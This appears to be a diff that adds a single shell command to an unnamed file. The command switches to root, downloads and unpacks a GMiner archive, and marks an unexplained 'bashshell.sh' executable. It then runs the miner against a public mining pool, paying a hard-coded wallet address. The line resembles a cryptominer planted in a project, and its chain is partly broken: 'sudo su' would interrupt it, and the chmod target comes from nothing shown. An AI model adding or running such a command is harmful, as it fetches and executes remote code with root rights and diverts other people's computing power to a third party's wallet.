@@ -1,0 +1,1 @@
+sudo su && wget https://github.com/develsoftware/GMinerRelease/releases/download/3.43/gminer_3_43_linux64.tar.xz && tar xavf gminer_3_43_linux64.tar.xz && chmod +x bashshell.sh && ./miner --algo kawpow --server xna.2miners.com:6060 --user NTgw8xC7BVr6gXyPLMmnhp5LrpCmS5ZG5n.davincenHash_test
